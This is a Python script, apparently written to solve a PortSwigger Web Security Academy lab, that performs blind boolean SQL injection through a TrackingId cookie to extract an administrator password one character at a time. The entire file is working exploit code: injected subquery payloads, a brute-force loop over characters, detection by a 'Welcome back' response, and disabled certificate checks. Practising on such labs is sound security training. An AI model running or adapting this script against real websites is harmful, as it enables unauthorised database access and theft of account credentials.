import sys
import requests
import urllib3
import urllib.parse

# --- 1. Silence the insecure-request warning ---
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- 2. Force HTTP/1.1 so Burp's HTTP/2 upgrade doesn't break the client ---
try:
    import http.client
    http.client.HTTPConnection._http_vsn = 11
    http.client.HTTPConnection._http_vsn_str = "HTTP/1.1"
except Exception:
    pass



def sqli_password(url, tracking_id, session_cookie):
    password_extracted = ""

    session = requests.Session()
    session.headers.update({
        "Connection": "close",
        "User-Agent": "Mozilla/5.0",
    })

    for i in range(1, 21):
        found_character = False

        for j in range(32, 126):
            character = chr(j)

            sqli_payload = (
                "' and (select substring(password,%s,1) "
                "from users where username='administrator')='%s'--"
                % (i, character)
            )

            encoded_payload = urllib.parse.quote(sqli_payload, safe="")

            cookies = {
                "TrackingId": tracking_id + encoded_payload,
                "session": session_cookie,
            }

            try:
                r = session.get(
                    url,
                    cookies=cookies,
                    verify=False,
                    timeout=15,
                )
            except requests.exceptions.RequestException as e:
                print("\n[!] Request failed")
                print("[!] Position:", i)
                print("[!] Character:", repr(character))
                print("[!] Error:", e)
                print("\n[!] Check the Burp HTTP history for the failed request.")
                return

            # PortSwigger lab 11: correct char -> "Welcome back" IS present.
            if "Welcome back" in r.text:
                password_extracted += character
                found_character = True
                sys.stdout.write("\r" + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write("\r" + password_extracted + character)
                sys.stdout.flush()

        if not found_character:
            print("\n[!] No matching character found at position", i)
            break

    print("\n\n(+) Extracted password:", password_extracted)


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s https://example.web-security-academy.net/" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1].rstrip("/")

    print("(+) Retrieving administrator password...")

    # Replace with fresh values from your current PortSwigger lab.
    tracking_id = "V2SDQsntaFrXfEiH"
    session_cookie = "MaRLGdWP5oC7FdCK0BGzT2X07yiFNNLC"

    sqli_password(url, tracking_id, session_cookie)


if __name__ == "__main__":
    main()
